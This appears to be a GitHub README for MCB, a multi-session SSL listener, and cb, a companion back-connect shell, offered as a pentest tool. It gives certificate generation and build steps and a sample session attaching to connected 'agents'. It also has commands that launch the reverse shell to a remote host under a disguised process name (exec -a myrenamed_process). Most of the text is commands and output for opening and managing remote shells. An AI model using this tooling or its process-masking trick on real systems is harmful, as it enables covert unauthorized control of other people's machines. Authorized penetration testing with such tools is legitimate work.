# MCB ( Multi Connect Back )
mcb is a tool for pentesters who want to get multiples pty over SSL.

First you need to make a certificate named mcb.pem using openssl :

```bash
openssl req -newkey rsa:4096 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat cert.pem key.pem > mcb.pem
```

no need to install third party package, mcb use std python3 librairies.

```bash
sh-5.1$ ./mcb 
./mcb <port>
sh-5.1$ ./mcb 9999
MCB listening on 9999
(MCB) 
```
then use the cb binary to connect to mcb and interact with agents:
```bash
new connection from ('127.0.0.1', 42074)
new connection from ('127.0.0.1', 42078)
new connection from ('127.0.0.1', 42080)
new connection from ('127.0.0.1', 42082)
new connection from ('127.0.0.1', 42084)
(MCB) list
0 SSLPTY fd=4 127.0.0.1:42074 => 9999:127.0.0.1
1 SSLPTY fd=5 127.0.0.1:42078 => 9999:127.0.0.1
2 SSLPTY fd=6 127.0.0.1:42080 => 9999:127.0.0.1
3 SSLPTY fd=7 127.0.0.1:42082 => 9999:127.0.0.1
4 SSLPTY fd=8 127.0.0.1:42084 => 9999:127.0.0.1
(MCB) interact 0
~~(__)°> 10:41:48 user@ono $ id
uid=1000(user) gid=1000(user) groups=1000(user),108(vboxusers)
~~(__)°> 10:42:21 user@ono $ 
Detached from fd=4
(MCB) 
```
MCB is like a poor man screen, you can switch between sessions, attaching with interact cmd and detaching with ^D

# CB ( Connect Back )
cb.c is the backconnect shell, you need to install musl-libc dev tools on your computer and clone mbedtls submodule.

```bash
git submodule update --init
make
```
Usage is simple it takes arg from args and env

```
$ bash -c "CHOST=192.168.0.39 CPORT=9999 exec -a myrenamed_process ./cb "
$ ./cb 192.168.0.39 9999
```

[![asciicast](https://asciinema.org/a/dvkXoXeG5uVmhnQMvRQhaE9DG.svg)](https://asciinema.org/a/dvkXoXeG5uVmhnQMvRQhaE9DG)
